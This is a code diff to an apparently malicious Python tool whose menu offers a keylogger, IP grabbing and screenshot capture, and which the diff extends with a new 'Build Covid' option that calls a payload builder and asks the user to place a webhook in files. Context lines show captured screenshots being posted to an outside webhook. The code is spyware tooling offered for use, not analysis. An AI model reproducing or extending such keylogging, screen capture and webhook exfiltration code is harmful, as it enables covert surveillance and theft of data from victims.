@@ -18,9 +18,13 @@ import io
 import mss
 import mss.tools
 import whois
+import os
+import subprocess
+from tkinter import Tk, filedialog
 from code.discordchecker import main
 from code.tiktokchecker import tiktok
 from code.githubchecker import git
+from builder import builder
 
 
 
@@ -700,8 +704,8 @@ while True:
             ╚██████╗╚██████╔╝ ╚████╔╝ ██║██████╔╝     ██║ █████╔╝
             ╚═════╝ ╚═════╝   ╚═══╝  ╚═╝╚═════╝      ╚═╝ ╚════╝ 
             
-            1. [KeyLogger]  4. [Quit]
-            2. [Grabing IP]
+            1. [KeyLogger]  4. [Build Covid (Go place Your Webhook in files)]
+            2. [Grabing IP] 5. [Quit]
             3. [ScreenShot]
 
                 {white}
@@ -817,8 +821,10 @@ while True:
                 }
 
                 requests.post(webhook, data={"content": "screenshot", "username": "WhiteWolf", "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"}, files=files)
-
         elif covid == "4":
+            builder()
+
+        elif covid == "5":
             print("Au-Revoir a bientot l'amis")
             time.sleep(2)
             break
